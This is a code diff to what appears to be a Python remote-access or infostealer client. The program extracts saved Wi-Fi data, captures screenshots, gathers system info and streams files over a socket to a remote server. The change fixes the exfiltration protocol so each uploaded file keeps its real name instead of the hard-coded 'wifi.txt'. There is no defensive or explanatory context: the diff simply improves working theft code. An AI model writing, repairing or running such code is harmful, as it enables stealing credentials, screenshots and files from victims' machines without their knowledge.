@@ -545,7 +545,9 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                     output_path = os.path.join(EXTRACT_FOLDER, "wifi.txt")
                     extract_wifi()
                     with open(output_path, "rb") as f:
-                        s.sendall(f"STARTFILE:wifi.txt\n".encode())
+                        basename = os.path.basename(f.name)
+                        s.sendall(f"STARTFILE:{basename}\n".encode())
+
                         while True:
                             chunk = f.read(1024)
                             if not chunk:
@@ -570,7 +572,8 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                 
                         # If saved successfully, send the file
                         with open(ss_path, "rb") as f:
-                            s.sendall(f"STARTFILE:wifi.txt\n".encode())
+                            basename = os.path.basename(f.name)  # or the appropriate filename
+                            s.sendall(f"STARTFILE:{basename}\n".encode())
                             while True:
                                 chunk = f.read(1024)
                                 if not chunk:
@@ -589,7 +592,8 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                     if os.path.exists(filename):
                         try:
                             with open(filename, "rb") as f:
-                                s.sendall(f"STARTFILE:wifi.txt\n".encode())
+                                basename = os.path.basename(f.name)  # or the appropriate filename
+                                s.sendall(f"STARTFILE:{basename}\n".encode())
                                 while True:
                                     chunk = f.read(1024)
                                     if not chunk:
